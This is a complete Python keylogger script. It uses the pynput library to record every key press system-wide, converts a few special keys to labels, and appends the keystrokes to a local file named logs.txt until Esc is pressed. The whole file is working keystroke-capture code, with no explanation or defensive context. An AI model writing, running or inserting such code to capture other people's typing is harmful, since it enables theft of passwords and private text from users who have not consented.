from pynput import keyboard
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.__file_name = "logs.txt"
        self.__stroke = 0
    def __OnPress(self, key):
        self.__stroke = str(key)

        if(self.__stroke == "Key.esc"):
            return False

        key_mappings = {
        "Key.enter": "\n",
        "Key.tab": "\t",
        "Key.space": "[SPACEBAR]",
        "Key.backspace": "[BACKSPACE]",

        "Key.left": "", 
        "Key.right": "",
        "Key.up": "",
        "Key.down": "",
        }

        self.__stroke = key_mappings.get(self.__stroke, self.__stroke)

        with open(self.__file_name, "a") as file:
            file.write(self.__stroke)                        
    def start(self):
        with keyboard.Listener(on_press=self.__OnPress) as listener:
            listener.join()
            
if __name__ == "__main__":
    logger = Keylogger()
    logger.start()